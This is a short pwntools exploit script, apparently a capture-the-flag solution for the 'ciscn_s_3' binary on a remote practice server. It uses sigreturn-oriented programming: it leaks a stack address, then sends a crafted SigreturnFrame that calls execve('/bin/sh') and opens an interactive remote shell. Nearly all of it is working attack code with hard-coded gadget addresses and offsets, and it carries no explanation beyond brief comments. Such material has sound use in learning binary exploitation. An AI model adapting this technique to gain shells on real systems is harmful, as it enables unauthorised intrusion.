#Made by fly_autumn
#x64 SROP
from pwn import *
#p = process("./ciscn_s_3")
p = remote("node5.buuoj.cn",29554)
elf = ELF("./ciscn_s_3")
context(os="linux",arch="amd64")

mov_rax_0xf = 0x4004da
syscall = 0x400517
vuln_plt = 0x4004ed

payload1 = b"A"*16 + p64(vuln_plt)
p.send(payload1)
offset = 0x118
#这里由于内核版本不同，打本地时偏移是0x148而打远程的偏移为0x118
buf_addr = u64(p.recv()[32:40]) - offset
log.success("buf_addr: "+hex(buf_addr))

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = buf_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall
payload = b"/bin/sh\0" + 8*b"A" +  p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)
#gdb.attach(p)


p.interactive()
